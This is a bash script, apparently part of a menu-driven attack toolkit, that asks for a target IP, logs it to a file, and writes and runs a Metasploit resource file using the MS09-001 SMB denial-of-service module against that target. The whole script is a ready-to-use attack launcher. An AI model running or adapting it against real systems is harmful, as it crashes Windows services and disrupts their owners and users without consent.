readrecent(){						#start read recent target function
	content=$(sed '1q;d' targetlist.txt)		#read first line of file
	echo "Your most recent target is $content"	#output previous target

}

saveTarget(){						#start save function
	sed -i "1 i $targ" targetlist.txt		#save target ip entered to file
}






echo -e "\e[31mMS09-001 Denial of Service Attack\e[0m"		#display exploit name
readrecent							#get most recent ip
read -p "TARGET IP:  " targ 					#ask for target ip

printf "TARGET IP --> $targ\n"					#show options configured
echo -e "\e[31mdo you wish to EXECUTE?\e[0m"			#ask user for consent to execute
read -p "(Y)/(N): " ready
case $ready in
	 Y)
	 	clear
	 	echo "EXECUTING"
	 	saveTarget $targ				#save ip
	 	echo "use auxiliary/dos/windows/smb/ms09_001_write
	 	set RHOST $targ
	 	exploit" > dos9.sh				#write exploit configuration to resource file
	 	msfconsole -q -r dos9.sh			#run exploit
	;;
	*)		#if not Y
		clear
		echo "Aborting"
		read -p "Do you wish to Return to the Menu (1) Quit (2) or reenter information (3)  " selection #ask for further actions
		case $selection in 
		1)					#if option 1
		bash menu.sh		#return to menu
		;;
		3)
		bash dosms091.sh	#restart current script
		;;
		*)
		echo "goodbye"		#quit
		;;
		esac
	;;
	esac